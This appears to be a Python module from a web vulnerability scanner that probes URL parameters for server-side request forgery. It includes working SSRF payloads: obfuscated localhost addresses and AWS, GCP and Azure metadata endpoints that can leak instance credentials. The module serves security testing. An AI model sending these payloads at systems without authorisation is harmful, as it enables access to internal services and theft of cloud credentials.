"""
SSRF detection module.
Tests for Server-Side Request Forgery via common parameters.
"""
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from .base import BaseModule
from ..core.reporter import Finding


class SSRFModule(BaseModule):
    name = "ssrf"
    description = "Server-Side Request Forgery"

    SSRF_PARAMS = [
        "url", "uri", "path", "dest", "redirect", "file", "page",
        "feed", "host", "site", "html", "data", "load", "request",
        "proxy", "img", "image", "link", "src", "source", "domain",
        "callback", "return", "fetch", "target", "to",
    ]

    INTERNAL_PAYLOADS = [
        ("http://127.0.0.1", "localhost"),
        ("http://localhost", "localhost"),
        ("http://[::1]", "ipv6_localhost"),
        ("http://0x7f000001", "hex_localhost"),
        ("http://0177.0.0.1", "octal_localhost"),
        ("http://2130706433", "decimal_localhost"),
        ("http://127.1", "short_localhost"),
        ("http://0", "zero"),
        ("http://169.254.169.254/latest/meta-data/", "aws_metadata"),
        ("http://metadata.google.internal/computeMetadata/v1/", "gcp_metadata"),
        ("http://169.254.169.254/metadata/instance", "azure_metadata"),
    ]

    CLOUD_INDICATORS = {
        "aws_metadata": ["ami-id", "instance-id", "instance-type", "local-hostname"],
        "gcp_metadata": ["attributes/", "service-accounts/", "project-id"],
        "azure_metadata": ["vmId", "subscriptionId", "resourceGroupName"],
    }

    def run(self, url: str, params: dict = None):
        self.log(f"Testing: {url}")
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)

        if params:
            query_params.update({k: [v] for k, v in params.items()})

        tested = set()
        for param_name in query_params:
            tested.add(param_name)
            self._test_param(url, parsed, query_params, param_name)

        for param_name in self.SSRF_PARAMS:
            if param_name not in tested:
                modified = dict(query_params)
                modified[param_name] = [""]
                self._test_param(url, parsed, modified, param_name)

    def _test_param(self, url, parsed, query_params, param_name):
        baseline = self.http.get(url)
        if not baseline:
            return

        for payload, payload_type in self.INTERNAL_PAYLOADS:
            test_url = self._build_url(parsed, query_params, param_name, payload)
            resp = self.http.get(test_url)
            if not resp:
                continue

            if resp.status_code == 200 and resp.text != baseline.text:
                if payload_type in self.CLOUD_INDICATORS:
                    for indicator in self.CLOUD_INDICATORS[payload_type]:
                        if indicator in resp.text:
                            self.reporter.add(Finding(
                                vuln_type="SSRF (Cloud Metadata)",
                                severity="CRITICAL",
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                evidence=f"Cloud metadata indicator: {indicator}",
                                details=f"Cloud: {payload_type}. Full account takeover possible via metadata credentials.",
                            ))
                            return

                internal_indicators = [
                    "Apache", "nginx", "404 Not Found", "IIS",
                    "It works!", "Welcome to", "Index of /",
                    "Connection refused", "No route to host",
                ]
                for ind in internal_indicators:
                    if ind in resp.text and ind not in baseline.text:
                        self.reporter.add(Finding(
                            vuln_type="SSRF (Internal Service)",
                            severity="HIGH",
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            evidence=f"Internal response indicator: {ind}",
                            details="Server fetched internal resource. Port scanning and internal service access possible.",
                        ))
                        return

        self._test_timing_ssrf(url, parsed, query_params, param_name)

    def _test_timing_ssrf(self, url, parsed, query_params, param_name):
        fast_payload = "http://192.0.2.1:1"
        fast_url = self._build_url(parsed, query_params, param_name, fast_payload)
        _, fast_time = self.http.timed_request("GET", fast_url, timeout=10)

        slow_payload = "http://10.255.255.1:80"
        slow_url = self._build_url(parsed, query_params, param_name, slow_payload)
        _, slow_time = self.http.timed_request("GET", slow_url, timeout=15)

        if slow_time > fast_time + 3 and slow_time > 5:
            self.reporter.add(Finding(
                vuln_type="SSRF (Timing-based)",
                severity="MEDIUM",
                url=url,
                parameter=param_name,
                payload=slow_payload,
                evidence=f"Fast: {fast_time:.1f}s, Slow: {slow_time:.1f}s",
                details="Significant timing difference suggests server-side request. Confirm with OOB callback.",
            ))

    def _build_url(self, parsed, query_params, param_name, payload):
        modified = dict(query_params)
        modified[param_name] = [payload]
        query_string = urlencode({k: v[0] for k, v in modified.items()})
        return urlunparse(parsed._replace(query=query_string))
